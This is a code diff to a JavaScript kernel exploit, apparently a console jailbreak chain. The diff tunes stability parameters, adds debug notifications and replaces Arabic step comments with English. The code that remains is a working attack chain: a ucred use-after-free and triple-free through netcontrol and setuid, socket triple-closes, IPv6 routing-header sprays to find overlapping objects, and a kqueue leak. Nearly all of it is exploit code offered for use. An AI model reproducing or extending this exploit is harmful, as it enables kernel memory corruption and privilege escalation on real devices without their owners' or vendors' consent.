@@ -114,12 +114,12 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 16;
+var IPV6_SOCK_NUM = 8;
 var IOV_THREAD_NUM = 4;
 var UIO_THREAD_NUM = 4;
-var MAIN_LOOP_ITERATIONS = 2;
-var TRIPLEFREE_ITERATIONS = 3;
-var MAX_ROUNDS_TWIN = 8;
+var MAIN_LOOP_ITERATIONS = 1;
+var TRIPLEFREE_ITERATIONS = 1;
+var MAX_ROUNDS_TWIN = 4;
 var MAX_ROUNDS_TRIPLET = 40;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
@@ -1303,17 +1303,20 @@ function trigger_ucred_triplefree() {
   var end = false;
   var uaf_socket = -1;
 
-  // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
 
   var main_count = 0;
 
+  send_notification("=== START TRIPLEFREE LOOP ===");
+
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
 
     main_count++;
+    send_notification("=== LOOP #" + main_count + " START ===");
 
-    // 1) dummy socket → register in netcontrol
+    // STEP 1
+    send_notification("[STEP 1] Creating dummy socket");
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
 
     var sock_buf = malloc(8);
@@ -1321,21 +1324,26 @@ function trigger_ucred_triplefree() {
     netcontrol(-1, 0x20000003, sock_buf, 8);
     close(new BigInt(dummy_socket));
 
-    // 2) allocate new ucred
+    // STEP 2
+    send_notification("[STEP 2] Allocating new ucred");
     setuid(1);
 
-    // 3) reclaim fd → uaf_socket
+    // STEP 3
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    send_notification("[STEP 3] Reclaimed uaf_socket=" + uaf_socket);
 
-    // 4) free previous ucred
+    // STEP 4
+    send_notification("[STEP 4] Freeing previous ucred");
     setuid(1);
 
-    // 5) unregister → free file + ucred
+    // STEP 5
+    send_notification("[STEP 5] Unregistering uaf_socket");
     var ctrl_buf = malloc(8);
     write32(ctrl_buf, uaf_socket);
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
 
-    // 6) محاولة إصلاح refcount بشكل خفيف
+    // STEP 6
+    send_notification("[STEP 6] Light refcount fix loop");
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
@@ -1343,28 +1351,30 @@ function trigger_ucred_triplefree() {
       read(new BigInt(iov_sock_0), tmp, 1);
     }
 
-    // 7) double free أول مرة
+    // STEP 7
+    send_notification("[STEP 7] First double-close");
     close(dup(new BigInt(uaf_socket)));
 
-    // 8) إيجاد التوأم
+    // STEP 8
+    send_notification("[STEP 8] Finding twins...");
     end = find_twins();
-    send_notification("[STEP 8] find_twins returned: end=" + end +
+    send_notification("[STEP 8] find_twins returned end=" + end +
                       " twins=[" + twins[0] + "," + twins[1] + "]");
 
     if (!end) {
+      send_notification("[STEP 8] Twins not found → CONTINUE LOOP");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
 
-    // 9) free واحدة من التوأم
-    send_notification("[STEP 9] freeing twin index=" + twins[1] +
-                      " fd=" + ipv6_socks[twins[1]]);
+    // STEP 9
+    send_notification("[STEP 9] Freeing twin index=" + twins[1]);
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // 10) انتظار refcount = 1
-    send_notification("[STEP 10] monitoring refcount on twin=" + twins[0]);
+    // STEP 10
+    send_notification("[STEP 10] Monitoring refcount on twin=" + twins[0]);
 
     var count = 0;
 
@@ -1380,52 +1390,60 @@ function trigger_ucred_triplefree() {
 
       var ref = read32(leak_rthdr);
 
+      // DEBUG REF
+      send_notification("[DEBUG] REFCOUNT READ = " + ref + " | count=" + count);
+
       if (ref <= 0) {
-        send_notification("[STEP 10] refcount success condition met");
+        send_notification("[DEBUG] STEP 10 BREAK TRIGGERED — ref <= 0");
         return true;
       }
 
       count++;
     }
 
-    send_notification("[STEP 10] max wait reached, continuing anyway");
+    send_notification("[STEP 10] Max wait reached → continue flow");
 
-    // 11) triple-close
+    // STEP 11
     close(dup(new BigInt(uaf_socket)));
-    send_notification("[STEP 11] triple-close on fd=" + uaf_socket);
+    send_notification("[STEP 11] triple-close executed");
+    send_notification("[DEBUG] ENTERED STEP 11");
 
-    // 12) محاولة إيجاد triplet1
+    // STEP 12
     triplets[1] = find_triplet(triplets[0], -1);
 
     if (triplets[1] === -1) {
-      send_notification("[STEP 12] triplet1 not found, continuing anyway");
+      send_notification("[STEP 12] triplet1 NOT FOUND");
     } else {
-      send_notification("[STEP 12] triplet1 found=" + triplets[1]);
+      send_notification("[STEP 12] triplet1 FOUND = " + triplets[1]);
     }
 
     write(new BigInt(iov_sock_1), tmp, 1);
 
-    // 13) محاولة إيجاد triplet2
+    // STEP 13
     triplets[2] = find_triplet(triplets[0], triplets[1]);
 
     if (triplets[2] === -1) {
-      send_notification("[STEP 13] triplet2 not found, continuing anyway");
+      send_notification("[STEP 13] triplet2 NOT FOUND");
     } else {
-      send_notification("[STEP 13] triplet2 found=" + triplets[2]);
+      send_notification("[STEP 13] triplet2 FOUND = " + triplets[2]);
     }
 
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
 
-  } // نهاية while
+    send_notification("=== LOOP #" + main_count + " END ===");
 
-  // لو خرجنا من اللوب بسبب استنفاد المحاولات
+  } // END WHILE
+
   if (main_count === TRIPLEFREE_ITERATIONS) {
+    send_notification("[END] Max iterations reached → FAIL");
     return false;
   }
 
+  send_notification("[END] Flow completed → SUCCESS");
   return true;
 }
+
 function leak_kqueue() {
   debug('Leaking kqueue...');
   // 1) صفّر الذاكرة مرة واحدة فقط
